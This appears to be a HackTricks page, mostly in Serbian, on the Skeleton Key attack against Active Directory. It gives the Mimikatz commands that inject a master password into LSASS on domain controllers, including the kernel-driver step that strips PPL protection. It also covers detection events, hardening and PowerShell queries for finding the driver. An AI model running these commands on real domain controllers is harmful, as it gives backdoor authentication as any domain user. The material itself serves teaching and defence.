# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

The **Skeleton Key attack** je tehnika koja omogućava napadačima da **zaobiđu Active Directory autentikaciju** tako što će **ubrizgati master lozinku** u LSASS proces svakog domain controller-a. Nakon ubrizgavanja, master lozinka (podrazumevano **`mimikatz`**) može se koristiti za autentifikaciju kao **bilo koji korisnik domena** dok njihove stvarne lozinke i dalje funkcionišu.

Key facts:

- Zahteva **Domain Admin/SYSTEM + SeDebugPrivilege** na svakom DC i mora se **ponovo primeniti nakon svakog ponovnog pokretanja**.
- Menja **NTLM** i **Kerberos RC4 (etype 0x17)** puteve validacije; realm‑ovi koji koriste samo AES ili nalozi koji zahtevaju AES neće **prihvatiti the skeleton key**.
- Može doći do konflikta sa paketima za LSA autentikaciju treće strane ili dodatnim smart‑card / MFA provajderima.
- The Mimikatz module prihvata opcionu opciju `/letaes` kako bi izbegao diranje Kerberos/AES hook‑ova u slučaju problema sa kompatibilnošću.

### Izvršenje

Klasičan LSASS bez PPL zaštite:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Ako je LSASS pokrenut kao PPL (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), potreban je kernel driver da se ukloni zaštita pre patchinga LSASS:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Nakon injekcije, autentifikujte se bilo kojim domain nalogom, ali koristite lozinku `mimikatz` (ili vrednost koju je postavio operator). Zapamtite da ponovite na **all DCs** u multi‑DC okruženjima.

## Mitigations

- **Praćenje logova**
- System **Event ID 7045** (instalacija servisa/drivera) za unsigned drivere kao što je `mimidrv.sys`.
- **Sysmon**: Event ID 7 (učitavanje drivera) za `mimidrv.sys`; Event ID 10 za sumnjiv pristup `lsass.exe` iz non‑system procesa.
- Security **Event ID 4673/4611** za upotrebu osetljivih privilegija ili anomalije pri registraciji LSA authentication package; korelirajte sa neočekivanim 4624 prijavama koje koriste RC4 (etype 0x17) sa DCs.
- **Ojačavanje LSASS-a**
- Održavajte **RunAsPPL/Credential Guard/Secure LSASS** omogućene na DCs kako biste primorali napadače na deploy kernel‑mode drivera (više telemetrije, teže iskorišćavanje).
- Onemogućite legacy **RC4** gde je moguće; Kerberos tickets ograničeni na AES sprečavaju RC4 hook putanju koju koristi skeleton key.
- Brze PowerShell pretrage:
- Detektujte instalacije unsigned kernel drivera: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Potražite Mimikatz driver: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Proverite da li je PPL primenjen nakon reboot-a: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Za dodatne smernice o ojačavanju kredencijala proverite [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## References

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
